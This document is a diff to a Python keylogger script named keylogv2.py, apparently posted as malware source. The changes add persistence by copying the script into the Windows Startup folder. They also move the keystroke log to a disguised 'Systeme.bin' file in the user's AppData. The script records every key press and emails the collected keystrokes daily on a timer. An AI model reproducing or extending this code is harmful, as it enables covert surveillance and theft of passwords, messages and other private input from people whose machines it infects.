@@ -5,7 +5,9 @@ more functionalities
 
 txt sended as string traited and clean
 
-other futues may i will add run with system start up
+run with system start up
+
+big greeting to "LET'S CHANGE OUR MONTALITY" Familly 
 
 """
 
@@ -19,18 +21,20 @@ import threading
 from threading import Thread
 import smtplib
 import datetime
+import getpass
+import os
+import shutil
 
 sendedToday = False
 #the path disired of your txt_keys file
-log_dir = "d:\Systeme.bin.txt"
-#to don't have a fine with a big size in future , we assure that after sending data clean the file
-f = open(log_dir, 'w') 
-f.close()
-
+USER_NAME = getpass.getuser()
+log_dir = ("C:/Users/%s/AppData/Systeme.bin"% USER_NAME)
+#i save the content in file name Syseme.bin i test the reading function and it work fine with .bin files it's like .txt
+#to don't have a probleme with a big size in future , we assure that after sending data clean the file
+#**************************************************************************************
 #main methode of email sender
 def run():
-    global sendedToday
-    print(sendedToday)
+    global log_dir
     while True:
       t = datetime.datetime.today()
       future = datetime.datetime(t.year,t.month,t.day,21,0)
@@ -62,9 +66,13 @@ def send():
     return
 #try link each carachter in each line in one string
 def link():
-    f = open('d:\Systeme.bin.txt', 'r+')
-    buffer = f.read()
-    f.close()
+    global log_dir
+    try :
+        f = open(log_dir, 'r+')
+        buffer = f.read()
+        f.close()
+    except:
+        return ""
     #save only the carachter and some special charachter
     msg = (buffer.replace("'","").replace("\n","").replace("Key.space"," ").replace("Key.caps_lock","^")
            .replace("Key.ctrl_l","*").replace("Key.backspace","<").replace("Key.right","").replace("Key.left","")
@@ -102,19 +110,43 @@ def Upper(msg):
     return "".join(la)
 
 #start the run methode separatley to don't use more time and memories while sending and typing
+#*********************************************************************************************#
+
+#copy the file to somewhere
+#basicly its enough to copy the file to start up
+#its possible to remove the originla file after the processof copying
+def save():
+    global USER_NAME
+    des = ("C:/Users/%s/AppData/values.txt"% USER_NAME)
+    try:
+        name = open(des,"r+")
+        
+    except:
+        name = open(des,"w+")
+        name.write("1")
+        
+        #copying the file to somewhere (in my case the startup path
+
+        filePath = os.getcwd()+ '\\' + "keylogv2.py"
+        Des_file = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+        shutil.copy2(filePath, Des_file)
+    finally:
+        name.close()    
+
+
+#**********************************************"#
+#Scope for starting email sending and saveing the file
 Thread(target = run ).start()
+Thread(target = save ).start()
+#***********************************************#
 
 # keystroke region
 logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(message)s')    
 #main function get the key and saved in a fine 
 def on_press(key):
     
-    
-     #Email.run()
      logging.info(str(key))
     
 with Listener(on_press=on_press) as listener:
     listener.join()
 time.sleep(15)
-
-
